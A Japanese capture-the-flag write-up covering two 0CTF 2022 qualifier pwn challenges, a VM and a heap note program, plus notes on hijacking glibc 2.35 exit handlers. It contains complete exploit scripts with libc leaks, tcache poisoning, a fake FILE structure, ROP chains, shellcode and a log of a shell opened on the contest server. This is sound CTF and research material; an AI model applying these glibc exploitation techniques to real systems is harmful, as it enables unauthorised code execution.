---
layout: page
title: "0ctf2022 qual pwn"
date: 2022-09-22 00:00:00 -0000
---

0ctfは2つのpwnを触っていて、どちらもチームの人が解き切りました。残りの時間はqqbotに使っていましたが時間切れとなっています。

このwriteupは、本命が提出できなかったときのバックアップを日本語にしたものになります。

とくに新しいことはなかったですが、せっかくなので残しておきます。hookがなくなったglibc 2.35のコード実行周りは少し紹介できていると思います。

# ezvm
かなり素直なVM問で複数回のコード入力を受け付けます。
利用できる命令列は以下のとおりです。

```
00: push
01: pop
02: add
03: sub
04: mul
05: div
06: mod
07: lsh
08: rsh
09: and
0b: or
0c: xor
0d: eq
0e: jmp
0f: jz
10: jnz
11: v1 == v2 then 1 else 0
12: v1 < v2 then 1 else 0
13: v1 > v2 then 1 else 0
14: reg[n] = x (imm64) 
15: mem[x] = reg[y] (store)
16: reg[x] = mem[y] (load)
17: ret
```

直接入出力はできませんが、ブランチやメモリ操作があります。また利用するメモリはサイズを毎回自由に指定することができます。

## バグ
オーバーフローするサイズのメモリ確保を1度だけ許してくれるというかなり怪しい処理があります。

またalloc後に初期化をしないので、ポインタが残ったままになります。

## Exploit: leak
直接出力してくれる命令はありませんが、正常終了するときと、未定義の命令コードに遭遇したときは終了時のメッセージが異なります。これを使ってビット単位で調べてリークしていきます。

タイムアウトがかなり厳しいので、自明なビットは省略して探索します。ビットが立っていると`jnz`が動いて正しく返り、そうでない場合は未定義命令`ff`をフェッチしてエラーを吐いて止まります。

```python
leak = 0xce0
for i in range(28):
        r.sendlineafter(b'continue?\n', b';')
        code = b''
        code += o_imm(0, 1)
        code += o_load(1, 0) # unsortedbin
        code += o_imm(2, 12+i)
        code += o_push(0)
        code += o_push(1)
        code += o_push(2)
        code += o_rsh()
        code += o_and()
        code += o_jnz(1)
        code += b'\xff'

        code = code.ljust(0x31, b'\x17')
        r.sendlineafter(b'size:\n', str(len(code)).encode())
        r.sendlineafter(b'count:\n', str(count).encode())
        r.sendafter(b'code:\n', code)
        ret = r.recvuntil(b'\n')
        if b'finish' not in ret:
                leak |= (1 << (12 + i))
                print(f"leak: {leak:x}")

leak |= 0x7f << 40
```

## Exploit: rip control
最後はオーバーフローするサイズを一度だけ許してくれる機能を使って、メモリを確保します。編集可能な範囲がほぼ無限になるので、これでlibcを書き換えます。

0x21000ほどの巨大なサイズのallocを実行すると、libcに隣接したところにアドレスを取れるので、そこから必要なところに上書きします。今回は`__run_exit_handlers`の[おそらくここ](https://elixir.bootlin.com/glibc/latest/source/stdlib/exit.c#L109)を使って作りました。

- ` __pointer_chk_guard_local`を０にする
- `initial+0x18`にスタックピボットガジェットを置く
- スタックにROPペイロードを設置して無限ループを抜ける

タイムアウトが厳しすぎるので、US西のサーバを立ち上げて送ってギリギリ間に合いました。

```python
from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './ezvm'
HOST = '47.252.3.1'
PORT = 40241

elf = ELF(TARGET)
def start():
        if not args.R:
                print("local")
                #return process(TARGET)
                return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
                # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
        else:
                print("remote")
                return remote(HOST, PORT)

def get_base_address(proc):
        lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
        for line in lines :
                if TARGET[2:] in line.split('/')[-1] :
                        break
        return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
        script = "handle SIGALRM ignore\n"
        PIE = get_base_address(proc)
        script += "set $base = 0x{:x}\n".format(PIE)
        for bp in breakpoints:
                script += "b *0x%x\n"%(PIE+bp)
        script += "c"
        gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

def o_push(n):
        return b'\x00'+p8(n)
def o_pop(n):
        return b'\x01'+p8(n)
def o_add():
        return b'\x02'
def o_sub():
        return b'\x03'
def o_mul():
        return b'\x04'
def o_div():
        return b'\x05'
def o_mod():
        return b'\x06'
def o_lsh():
        return b'\x07'
def o_rsh():
        return b'\x08'
def o_and():
        return b'\x09'
def o_or():
        return b'\x0b'
def o_xor():
        return b'\x0c'
def o_eq():
        return b'\x0d'
def o_jmp(ofs):
        return b'\x0e'+p64(ofs)
def o_jz(ofs):
        return b'\x0f'+p64(ofs)
def o_jnz(ofs):
        return b'\x10'+p64(ofs)
def o_eq():
        return b'\x11'
def o_lt():
        return b'\x12'
def o_gt():
        return b'\x13'
def o_imm(n, v):
        return b'\x14' + p8(n) + p64(v)
def o_str(n, v):
        return b'\x15' + p8(n) + p64(v)
def o_load(n, v):
        return b'\x16' + p8(n) + p64(v)

def o_ret():
        return b'\x17'

r.sendlineafter(b'!!\n', b'a'*0xff)

# place libc address at heap
count = 131
code = b''
code = code.ljust(0x38, b'\x17')
r.sendlineafter(b'size:\n', str(len(code)).encode())
r.sendlineafter(b'count:\n', str(count).encode())
r.sendafter(b'code:\n', code)

# leak libc with error based method
leak = 0xce0
for i in range(28):
        r.sendlineafter(b'continue?\n', b';')
        code = b''
        code += o_imm(0, 1)
        code += o_load(1, 0) # unsortedbin
        code += o_imm(2, 12+i)
        code += o_push(0)
        code += o_push(1)
        code += o_push(2)
        code += o_rsh()
        code += o_and()
        code += o_jnz(1)
        code += b'\xff'

        code = code.ljust(0x31, b'\x17')
        r.sendlineafter(b'size:\n', str(len(code)).encode())
        r.sendlineafter(b'count:\n', str(count).encode())
        r.sendafter(b'code:\n', code)
        ret = r.recvuntil(b'\n')
        if b'finish' not in ret:
                leak |= (1 << (12 + i))
                print(f"leak: {leak:x}")

leak |= 0x7f << 40
base = leak - 0x219ce0
print(f"leak: {leak:x}")
print(f"base: {base:x}")

def rol(v, n, bits = 64):
        hi = v >> (bits - n)
        out = (( v << n ) | hi) & ((2 ** bits) -1)
        #print(f"DEBUG: {v:x} --> {out:x}")
        return out

binsh = base + 0x1d8698
system = base + 0x50d60
exitfunc = base + 0x21af18
rdi = base + 0x001bc021
membase = base - 0x24ff0
r.sendlineafter(b'continue?\n', b';')

# set exit_function
code = b''
# pointer_guard = 0
code += o_str(0, (((base-0x2a00)-membase+0x170) // 8))
# stack pivot gadget
code += o_imm(1, rol(rdi, 0x11))
code += o_str(1, ((exitfunc-membase) // 8)) 
code += b'\x17'

context.log_level = 'debug'
r.sendlineafter(b'size:\n', str(len(code)).encode())
r.sendlineafter(b'count:\n', str((0x10000000000000000|0x21000)>>3).encode())
if args.D:
        #debug(r, [0x1458])
        #debug(r, [])
        debug(r, [0x228d])
r.sendafter(b'code:\n', code)

# set rop and call exit_function
payload = b''
payload += b'bye bye\x00'
payload = payload.ljust(0xb0, b'a')
payload += flat(rdi, binsh, system)
r.sendlineafter(b'continue?\n', payload)

r.interactive()
r.close()

'''
-- at ec2-west-2 --
[+] Opening connection to 47.252.3.1 on port 40241: Done
leak: 1ce0
leak: 3ce0
leak: bce0
leak: 1bce0
leak: 5bce0
leak: 25bce0
leak: 825bce0
leak: 1825bce0
leak: 3825bce0
leak: b825bce0
leak: 1b825bce0
leak: 5b825bce0
leak: db825bce0
leak: 1db825bce0
leak: 3db825bce0
leak: bdb825bce0
leak: 7fbdb825bce0
base: 7fbdb8042000
[DEBUG] Received 0x1c bytes:
    b'Please input your code size:'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Sent 0x3 bytes:
    b'31\n'
[DEBUG] Received 0x1f bytes:
    b'Please input your memory count:'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Sent 0x14 bytes:
    b'2305843009213710848\n'
[DEBUG] Received 0x14 bytes:
    b'OK, only one chance.'
[DEBUG] Received 0x19 bytes:
    b'\n'
    b'Please input your code:\n'
[DEBUG] Sent 0x1f bytes:
    00000000  15 00 ec 44  00 00 00 00  00 00 14 01  00 00 42 c0  │···D│····│····│··B·│
    00000010  3f 70 7b ff  15 01 e1 7f  04 00 00 00  00 00 17     │?p{·│····│····│···│
    0000001f
[DEBUG] Received 0x7 bytes:
    b'finish!'
[DEBUG] Received 0xb bytes:
    b'\n'
    b'continue?\n'
[DEBUG] Sent 0xc9 bytes:
    00000000  62 79 65 20  62 79 65 00  61 61 61 61  61 61 61 61  │bye │bye·│aaaa│aaaa│
    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    000000b0  21 e0 1f b8  bd 7f 00 00  98 a6 21 b8  bd 7f 00 00  │!···│····│··!·│····│
    000000c0  60 2d 09 b8  bd 7f 00 00  0a                        │`-··│····│·│
    000000c9
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x13 bytes:
    b'ezvm\n'
    b'flag\n'
    b'start.sh\n'
ezvm
flag
start.sh
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x25 bytes:
    b'flag{G96i1AfjyXznrnnK4VDY0fCH1t4Q3P}\n'
flag{G96i1AfjyXznrnnK4VDY0fCH1t4Q3P}
'''

```

# babyheap
典型的なノート問です。

## バグ
バグは`Update`にあって、サイズに負の値を渡すことができます。これによってheapにほぼ無限に書き込めます。

```c
  else {
    printf("Size: ");
    lVar2 = r_get_int();
    if (*(long *)(param_1 + (long)(int)uVar1 * 0x18 + 8) < lVar2) {
      puts("Invalid Size");
    }
    else {
      printf("Content: ");
      get_bytes(*(undefined8 *)(param_1 + (long)(int)uVar1 * 0x18 + 0x10),lVar2);
      printf("Chunk %d Updated\n",(ulong)uVar1);
    }
  }
  return;
```

## Exploit: leak
UAFがないこと、入力がnullで終端されることから、以下のようにオーバーラップを作ってリークさせることを考えます。
1. 下図のようにチャンクを並べます。
2. #4をfreeして#1までつなぎます。
3. #2の位置に合うようにチャンクを適当にallocします。
4. #6をfreeして、unsortedbinにheapのアドレスをつなぎます。
5. #2を見てリークを取得します。

```
Chunk #0    [ALLOC] <-- #1のヘッダを編集する
Chunk #1    [FREE ] <-- ヘッダを大きくしておく
Chunk #2    [ALLOC] <-- for leak
Chunk #3    [ALLOC] <-- for tcache poisoning
Chunk #4    [ALLOC] <-- make prev inuse をfalseにしてprev sizeを入れておく
Chunk #5    [ALLOC] <-- guard chunk
Chunk #6    [ALLOC] <-- unsortedbinにつながるサイズのチャンクを入れる
Chunk #7    [ALLOC] <-- guard chunk
Chunk #8-15 [FREE ] <-- tcacheを満タンにしておく
```

## Exploit: rip control
seccompの設定から今回はROPする必要があるので、stackかheapにピボットを考えます。

AARがうまく作れなかったので、[House of Emma](https://www.anquanke.com/post/id/260614) を使ってheapにピボットすることにしました。

手順は以下のとおりです。
1. #3, #2 の順にfreeする
2. #2のfdをper-thread struct(heap + 0x10)に向ける
3. per-thread structを書き換えてAAWを取得する
4. `stderr`ポインタをheapへ, main_arenaの `top`はどこか読めるところへ, ` __pointer_chk_guard_local`を0に、それぞれ変更する
5. 少し大きなサイズをallocして、 `_int_malloc --> sysmalloc --> __malloc_assert --> [fake_io_file] --> _IO_cookie_write`でripを奪い、ヒープにピボットする。

今回は`mov rsp, rdx; ret`を使いたいのでrdxのコントロールが必須です。`__call_tls_dtors`はrdxにrwなエリアが割り当てられるのでいいぞとアドバイスいただいたのですが、うまくブランチの入り方がわかっていなかったので、`mov rdx, [rdi+8]; mov [rsp], rax; call qword ptr [rdx+0x20];`というコードでrdxを引っ張ってきました。

## Script
```python
from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './babyheap'
HOST = '47.100.33.132'
PORT = 2204

elf = ELF(TARGET)
def start():
        if not args.R:
                print("local")
                return process(TARGET)
                # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
                # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
        else:
                print("remote")
                return remote(HOST, PORT)

def get_base_address(proc):
        lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
        for line in lines :
                if TARGET[2:] in line.split('/')[-1] :
                        break
        return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
        script = "handle SIGALRM ignore\n"
        PIE = get_base_address(proc)
        script += "set $base = 0x{:x}\n".format(PIE)
        for bp in breakpoints:
                script += "b *0x%x\n"%(PIE+bp)
        script += "c"
        gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
        debug(r, [])

def a(size, data):
        r.sendlineafter(b'mand: ', b'1')
        r.sendlineafter(b'Size: ', str(size).encode())
        r.sendlineafter(b'tent: ', data)

def e(idx, data, size=-1):
        r.sendlineafter(b'mand: ', b'2')
        r.sendlineafter(b'ndex: ', str(idx).encode())
        r.sendlineafter(b'Size: ', str(size).encode())
        r.sendlineafter(b'tent: ', data)

def d(idx):
        r.sendlineafter(b'mand: ', b'3')
        r.sendlineafter(b'ndex: ', str(idx).encode())

def v(idx):
        r.sendlineafter(b'mand: ', b'4')
        r.sendlineafter(b'ndex: ', str(idx).encode())

a(0x18, b'00000000')
a(0x88, b'11111111')
a(0x18, b'22222222') #2
a(0x18, b'33333333') #3
a(0x88, b'44444444')
a(0x18, b'guard')
for i in range(7):
        a(0x88, b'a')

for i in range(7):
        d(12-i)

a(0x418, b'heap leak') #7
a(0x18, b'guard')

d(1)
e(0, b'!'*0x18+p64(0xd1)[:-1])
e(3, b'!'*0x10+flat(0xd0, 0x90))

d(4)
a(0x48, b'adjust for leak')
a(0x38, b'adjust for leak')

d(6)
v(2)
r.recvuntil(b'[2]: ')
leak = u64(r.recv(8))
#print(f"leak: {leak:x}")
base = leak - 0x219ce0

# emma setups
top = base + 0x219ce0
stderr = base + 0x21a860
fs0x30 = base - 0x2900+0x70
cookie_jumps = base + 0x215b80
gadget = base + 0x001675b0 # mov rdx, [rdi+8]; mov [rsp], rax; call qword ptr [rdx+0x20];
pivot = base + 0x0005a170

# rop gadgets
p4 = base + 0x2a3de
mprotect = base + 0x11ec50
rdi = base + 0x2a3e4+1
rsi_p1 = base + 0x2a3e4-1
rdx_p1 = base + 0x00175548
syscall = base + 0x00140ffb
rax = base + 0x001284f0

leak = u64(r.recv(8))
#print(f"leak: {leak:x}")
heap = leak - 0x820

print(f"base: {base:x}")
print(f"heap: {heap:x}")

a(0xc8,  b'fill unsortedbin')
a(0x418, b'fill unsortedbin')

def ptr_protect(v, addr):
        return v ^ (addr >> 12)

# fill
payload = b''
payload += b'@'*0x18
payload += flat(0x51)
payload += b'@'*0x48
payload += flat(0x41)
payload += b'@'*0x38

# change header size
payload += flat(0x291)
payload += b'2'*0x18
payload += flat(0x291)
payload += b'3'*0x18
payload += flat(0x91)
payload += b'4'*0x88
payload += flat(0x21)[:-1]
e(0, payload)

# create tcache list
d(3)
d(2)

payload = b''
payload += b'@'*0x18
payload += flat(0x51)
payload += b'@'*0x48
payload += flat(0x41)
payload += b'@'*0x38

# tcache poisoning ( point to per-thread struct )
payload += flat(0x291, ptr_protect(heap+0x10, heap+0x350))
payload += b'2'*0x10
payload += flat(0x291, ptr_protect(0, heap+0x370))
payload += b'3'*0x10
payload += flat(0x91)
payload += b'4'*0x88
payload += flat(0x21)[:-1]
assert b'\x0a' not in payload, "BAD LUCK!!"
e(0, payload)

# overwrite per-thread struct
a(0x288, b'aaaaaaaa')
fake = b''
fake += flat(0x1000100010001) * 16
fake += flat(top, stderr, fs0x30)
a(0x288, fake)

a(0x18, p64(heap)) # top points to somewhere readable
a(0x28, p64(heap+0x2a0)) # stderr points to our fake io_file struct
a(0x38, p64(0)) # disable randomization at mangle ( now fs:0x30 = 0 )

def rol(v, n, bits = 64):
        hi = v >> (bits - n)
        out = (( v << n ) | hi) & ((2 ** bits) -1)
        #print(f"DEBUG: {v:x} --> {out:x}")
        return out

# build fake io_file struct  with vtable: _IO_cookie_jumps + 0x40
payload = b''
payload += flat(0, 0, 0, 0)
payload += flat(0, 0xffffffffffffffff)
payload += flat(0, 0, 0)
payload = payload.ljust(0x68, b'\x00')
payload += flat(0) # chain
payload = payload.ljust(0x88, b'\x00')
payload += flat(heap) # rw addr
payload = payload.ljust(0xc0, b'\x00')
payload += flat(0) # mode
payload = payload.ljust(0xd8, b'\x00')
payload += flat(cookie_jumps+0x40) # mode
payload += flat(heap+0x3a0, 0, rol(gadget, 0x11))
payload = payload.ljust(0x100, b'\x00')
payload += flat(p4, heap+0x3a0, 0, 0, pivot)
payload += flat(rdi, heap, rsi_p1, 0x1000, 0, rdx_p1, 7, 0, mprotect)
payload += flat(rdi, 0, rsi_p1, heap, 0, rdx_p1, 0x1000, 0, rax, 0, syscall, heap)

# set our io_file struct to heap+0x2a0
e(0, payload)

# _int_malloc --> sysmalloc --> __malloc_assert --> [fake_io_file] --> _IO_cookie_write
r.sendlineafter(b'mand: ', b'1')
r.sendlineafter(b'Size: ', str(0x438).encode())

# shellcode
payload = b''
payload += asm(f'''
        mov rax, 2
        xor esi, esi
        xor edx, edx
        mov rdi, {heap+0x200}
        syscall
        mov rdi, rax
        mov rsi, {heap+0x210}
        mov rdx, 0x100
        xor eax, eax
        syscall
        mov rdx, rax
        mov rdi, 1
        mov rsi, {heap+0x210}
        mov rax, 1
        syscall
        xor edi, edi
        mov rax, 60
        syscall
''')
payload = payload.ljust(0x200, b'\xf4')
payload += b'/flag\x00'
r.send(payload)

r.interactive()
r.close()

# flag{REVEAL-the-PTR__h00k-an0ther-func__capture-th3-fl4g}
```

# おまけ: __call_tls_dtors
せっかくなので、紹介してもらったものも検証します。
`__call_tls_dtors`は`__run_exit_handlers`の[ここ](https://elixir.bootlin.com/glibc/latest/source/stdlib/exit.c#L46)から呼ばれます。

そもそもexitを呼ばないとダメなのでは。と思っていましたが、この関数は`__libc_start_call_main`に処理が返る場合、つまりmainから処理が返った場合は必ず呼ばれます。
```
__libc_start_call_main
    __GI_exit
        __run_exit_handlers
```

`__call_tls_dtors`自体は、`tls_dtor_list`が存在する限りひたすら関数を呼んでくれるようです。ポインタはmangleありなので、これはリークか書き換えが必要です。

```c
void
__call_tls_dtors (void)
{
  while (tls_dtor_list)
    {
      struct dtor_list *cur = tls_dtor_list;
      dtor_func func = cur->func;
#ifdef PTR_DEMANGLE
      PTR_DEMANGLE (func);
#endif

      tls_dtor_list = tls_dtor_list->next;
      func (cur->obj);

      /* Ensure that the MAP dereference happens before
	 l_tls_dtor_count decrement.  That way, we protect this access from a
	 potential DSO unload in _dl_close_worker, which happens when
	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */
      atomic_fetch_add_release (&cur->map->l_tls_dtor_count, -1);
      free (cur);
    }
}
```
[参考](https://elixir.bootlin.com/glibc/latest/source/stdlib/cxa_thread_atexit_impl.c#L148)

`dtor_list`, `dtor_func`の型はこんな感じになっています。
```c
typedef void (*dtor_func) (void *);

struct dtor_list
{
  dtor_func func;
  void *obj;
  struct link_map *map;
  struct dtor_list *next;
};

static __thread struct dtor_list *tls_dtor_list;
```
[参考](https://elixir.bootlin.com/glibc/latest/source/stdlib/cxa_thread_atexit_impl.c#L79)


`tls_dtor_list`の場所が知りたいのでgdbで見てみます。

```
Dump of assembler code for function __GI___call_tls_dtors:
   0x00007ffff7dbfd60 <+0>:     endbr64 
   0x00007ffff7dbfd64 <+4>:     push   rbp
   0x00007ffff7dbfd65 <+5>:     push   rbx
   0x00007ffff7dbfd66 <+6>:     sub    rsp,0x8
   0x00007ffff7dbfd6a <+10>:    mov    rbx,QWORD PTR [rip+0x1d301f]        # 0x7ffff7f92d90
   0x00007ffff7dbfd71 <+17>:    mov    rbp,QWORD PTR fs:[rbx]
   0x00007ffff7dbfd75 <+21>:    test   rbp,rbp
   0x00007ffff7dbfd78 <+24>:    je     0x7ffff7dbfdbd <__GI___call_tls_dtors+93>
   0x00007ffff7dbfd7a <+26>:    nop    WORD PTR [rax+rax*1+0x0]
   0x00007ffff7dbfd80 <+32>:    mov    rdx,QWORD PTR [rbp+0x18]
   0x00007ffff7dbfd84 <+36>:    mov    rax,QWORD PTR [rbp+0x0]
   0x00007ffff7dbfd88 <+40>:    ror    rax,0x11
   0x00007ffff7dbfd8c <+44>:    xor    rax,QWORD PTR fs:0x30
   0x00007ffff7dbfd95 <+53>:    mov    QWORD PTR fs:[rbx],rdx
   0x00007ffff7dbfd99 <+57>:    mov    rdi,QWORD PTR [rbp+0x8]
   0x00007ffff7dbfd9d <+61>:    call   rax
   0x00007ffff7dbfd9f <+63>:    mov    rax,QWORD PTR [rbp+0x10]
   0x00007ffff7dbfda3 <+67>:    lock sub QWORD PTR [rax+0x468],0x1
   0x00007ffff7dbfdac <+76>:    mov    rdi,rbp
   0x00007ffff7dbfdaf <+79>:    call   0x7ffff7da2370 <free@plt>
   0x00007ffff7dbfdb4 <+84>:    mov    rbp,QWORD PTR fs:[rbx]
   0x00007ffff7dbfdb8 <+88>:    test   rbp,rbp
   0x00007ffff7dbfdbb <+91>:    jne    0x7ffff7dbfd80 <__GI___call_tls_dtors+32>
   0x00007ffff7dbfdbd <+93>:    add    rsp,0x8
   0x00007ffff7dbfdc1 <+97>:    pop    rbx
   0x00007ffff7dbfdc2 <+98>:    pop    rbp
   0x00007ffff7dbfdc3 <+99>:    ret    
   ```

`fs:0xffffffffffffffa8`ということでfsから-0x58のところにあるようです。

今回はcanaryの位置から`0x7ffff7d77740`がfs_baseのようです。（ちゃんとした確認方法を募集中です。arch_prctlを自由に撃てる？）

```
gef➤  x/gx 0x7ffff7f92d90
0x7ffff7f92d90: 0xffffffffffffffa8

gef➤  x/100gx 0x007ffff7d7a000-0x2a00
0x7ffff7d77600: 0x0000000000000000      0x0000000000000000
0x7ffff7d77610: 0x0000000000000000      0x0000000000000000
0x7ffff7d77620: 0x0000000000000000      0x0000000000000000
0x7ffff7d77630: 0x0000000000000000      0x0000000000000000
0x7ffff7d77640: 0x0000000000000000      0x0000000000000000
0x7ffff7d77650: 0x0000000000000000      0x0000000000000000
0x7ffff7d77660: 0x0000000000000000      0x0000000000000000
0x7ffff7d77670: 0x0000000000000000      0x0000000000000000
0x7ffff7d77680: 0x0000000000000000      0x0000000000000000
0x7ffff7d77690: 0x0000000000000000      0x0000000000000000
0x7ffff7d776a0: 0x0000000000000000      0x0000000000000000
0x7ffff7d776b0: 0x00007ffff7f94580      0x00007ffff7f9c340
0x7ffff7d776c0: 0x0000000000000000      0x00007ffff7f384c0
0x7ffff7d776d0: 0x00007ffff7f38ac0      0x00007ffff7f393c0
0x7ffff7d776e0: 0x0000000000000000      0x0000000000000000
0x7ffff7d776f0: 0x0000000000000000      0x0000000000000000
0x7ffff7d77700: 0x0000000000000000      0x0000000000000000
0x7ffff7d77710: 0x0000000000000000      0x0000000000000000
0x7ffff7d77720: 0x0000000000000000      0x0000000000000000
0x7ffff7d77730: 0x0000000000000000      0x0000000000000000
0x7ffff7d77740: 0x00007ffff7d77740      0x00007ffff7d78160
0x7ffff7d77750: 0x00007ffff7d77740      0x0000000000000000
0x7ffff7d77760: 0x0000000000000000      0x5302289e1396d500
0x7ffff7d77770: 0x2babc469a1079e51      0x0000000000000000
0x7ffff7d77780: 0x0000000000000000      0x0000000000000000
0x7ffff7d77790: 0x0000000000000000      0x0000000000000000
0x7ffff7d777a0: 0x0000000000000000      0x0000000000000000
0x7ffff7d777b0: 0x0000000000000000      0x0000000000000000
```

`0x7ffff7d776e8`が`tls_dtor_list`のはずなので適当に入れて壊してみます。

（オフセット計算を失敗して上の結果とは別のアドレスになりましたが、）以下のような位置で無事SEGVできます。`tls_dtor_list`は`rbp`に入るようです。`leave`と組み合わせたらかなりお手軽にピボットできそうです。

```
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0xffffffffffffffa8
$rcx   : 0x1               
$rdx   : 0x1               
$rsp   : 0x007fffffffdca0  →  0x0000000000000000
$rbp   : 0xbeef            
$rsi   : 0x007ffff7f93838  →  0x007ffff7f94f00  →  0x0000000000000000
$rdi   : 0x0               
$rip   : 0x007ffff7dbfd80  →  <__call_tls_dtors+32> mov rdx, QWORD PTR [rbp+0x18]
$r8    : 0x200             
$r9    : 0x007ffff7fc9040  →  <_dl_fini+0> endbr64 
$r10   : 0x007ffff7fc3908  →  0x000d00120000000e
$r11   : 0x246             
$r12   : 0x007ffff7f93838  →  0x007ffff7f94f00  →  0x0000000000000000
$r13   : 0x005555555563d1  →   endbr64 
$r14   : 0x0               
$r15   : 0x007ffff7ffd040  →  0x007ffff7ffe2e0  →  0x00555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdca0│+0x0000: 0x0000000000000000     ← $rsp
0x007fffffffdca8│+0x0008: 0x0000000000000000
0x007fffffffdcb0│+0x0010: 0x0000000000000000
0x007fffffffdcb8│+0x0018: 0x007ffff7dbf5c9  →  <__run_exit_handlers+569> jmp 0x7ffff7dbf3b3 <__run_exit_handlers+35>
0x007fffffffdcc0│+0x0020: 0x0000000000000000
0x007fffffffdcc8│+0x0028: 0x0000000000000000
0x007fffffffdcd0│+0x0030: 0x0000000000000000
0x007fffffffdcd8│+0x0038: 0x0000000100000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7dbfd75 <__call_tls_dtors+21> test   rbp, rbp
   0x7ffff7dbfd78 <__call_tls_dtors+24> je     0x7ffff7dbfdbd <__GI___call_tls_dtors+93>
   0x7ffff7dbfd7a <__call_tls_dtors+26> nop    WORD PTR [rax+rax*1+0x0]
 → 0x7ffff7dbfd80 <__call_tls_dtors+32> mov    rdx, QWORD PTR [rbp+0x18]
   0x7ffff7dbfd84 <__call_tls_dtors+36> mov    rax, QWORD PTR [rbp+0x0]
   0x7ffff7dbfd88 <__call_tls_dtors+40> ror    rax, 0x11
   0x7ffff7dbfd8c <__call_tls_dtors+44> xor    rax, QWORD PTR fs:0x30
   0x7ffff7dbfd95 <__call_tls_dtors+53> mov    QWORD PTR fs:[rbx], rdx
   0x7ffff7dbfd99 <__call_tls_dtors+57> mov    rdi, QWORD PTR [rbp+0x8]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ezvm", stopped 0x7ffff7dbfd80 in __GI___call_tls_dtors (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7dbfd80 → __GI___call_tls_dtors()
[#1] 0x7ffff7dbf5c9 → __run_exit_handlers(status=0x0, listp=0x7ffff7f93838 <__exit_funcs>, run_list_atexit=0x1, run_dtors=0x1)
[#2] 0x7ffff7dbf610 → __GI_exit(status=<optimized out>)
[#3] 0x7ffff7da3d97 → __libc_start_call_main(main=0x5555555563d1, argc=0x1, argv=0x7fffffffde38)
[#4] 0x7ffff7da3e40 → __libc_start_main_impl(main=0x5555555563d1, argc=0x1, argv=0x7fffffffde38, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffde28)
[#5] 0x5555555551ee → hlt 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

ということで、さきほどのezvmの最後はこんな感じに書き換えるとうまく行きます。COPでがんばならくていいというのはかなり安心感があります。

```python
leave = base + 0x00133d9a
binsh = base + 0x1d8698
system = base + 0x50d60
rdi = base + 0x001bc021
tls = base - 0x28c0
membase = base - 0x24ff0
print(f"membase: {membase:x}")
r.sendlineafter(b'continue?\n', b';')

code = b''

# pointer_guard = 0
code += o_str(0, (((tls+0x30)-membase) // 8))

# set heap addr to tls_dtor_list
code += o_imm(1, tls+0x100)
code += o_str(1, ((tls-0x58 - membase) // 8)) 

# set fake tls_dtor_list
code += o_imm(0, rol(system, 0x11))
code += o_str(0, ((tls+0x100 - membase) // 8)) 
code += o_imm(0, binsh)
code += o_str(0, ((tls+0x108 - membase) // 8)) 
code += b'\x17'

context.log_level = 'debug'
r.sendlineafter(b'size:\n', str(len(code)).encode())
r.sendlineafter(b'count:\n', str((0x10000000000000000|0x21000)>>3).encode())
if args.D:
        #debug(r, [0x1458])
        #debug(r, [])
        debug(r, [0x228d])
r.sendafter(b'code:\n', code)

# just call exit_function
payload = b''
payload += b'bye bye\x00'
r.sendlineafter(b'continue?\n', payload)
```

babyheapの方はこうなりました。seccomp問には刺さりますね。ただし`tls_dtor_list`は+8のアドレスにいるため、largebin attack等を利用して上書きをする場合などは利用できないです。

```
leave = base + 0x133d9a
tls = base - 0x28c0

# overwrite per-thread struct
a(0x288, b'aaaaaaaa')
fake = b''
fake += flat(0x1000100010001) * 16
fake += flat(tls+0x30, tls-0x60)
a(0x288, fake)

a(0x18, p64(0)) # disable randomization at mangle ( now fs:0x30 = 0 )
a(0x28, flat(0, heap+0x2a0)) # fake tls_dtor_list

def rol(v, n, bits = 64):
        hi = v >> (bits - n)
        out = (( v << n ) | hi) & ((2 ** bits) -1)
        #print(f"DEBUG: {v:x} --> {out:x}")
        return out

payload = b''
payload += flat(rol(leave, 0x11))
payload += flat(rdi, heap, rsi_p1, 0x1000, 0, rdx_p1, 7, 0, mprotect)
payload += flat(rdi, 0, rsi_p1, heap, 0, rdx_p1, 0x1000, 0, rax, 0, syscall, heap)
```

# まとめ
- `__run_exit_handlers`: fs:0x30とポインタの改ざん、mainから返ることで実行されます。rdiをコントロールできます。
